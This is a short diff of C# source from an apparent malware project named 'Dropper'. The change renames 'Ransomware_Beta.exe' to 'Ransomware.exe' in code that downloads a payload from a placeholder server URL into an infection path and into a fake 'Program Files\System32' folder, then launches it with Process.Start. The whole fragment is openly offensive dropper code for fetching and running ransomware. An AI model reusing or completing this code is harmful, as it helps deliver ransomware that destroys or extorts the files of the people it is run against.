@@ -87,7 +87,7 @@ namespace Dropper
                 new AsyncCompletedEventHandler(DownloadFileCallback2);
             // Specify a progress notification handler here ...
             client.DownloadFileAsync(uri,
-                                     pathToInfect + @"\Malware\Ransomware_Beta.exe");
+                                     pathToInfect + @"\Malware\Ransomware.exe");
         }
         private static void DownloadFileCallback2(object sender,
                                                   AsyncCompletedEventArgs e)
@@ -110,7 +110,7 @@ namespace Dropper
             {
                 WebClient webClient = new WebClient();
                 webClient.DownloadFile("URl to local server",
-                                       @"C:\Program Files\System32\Ransomware_Beta.exe");
+                                       @"C:\Program Files\System32\Ransomware.exe");
             }
             catch (WebException e)
             {
@@ -120,7 +120,7 @@ namespace Dropper
 
         private static void LaunchLocally()
         {
-            Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
+            Process.Start(pathToInfect + @"\Malware\local\Ransomware.exe");
         }
 
         private void DropperGUI_FormClosing(object sender, FormClosingEventArgs e)
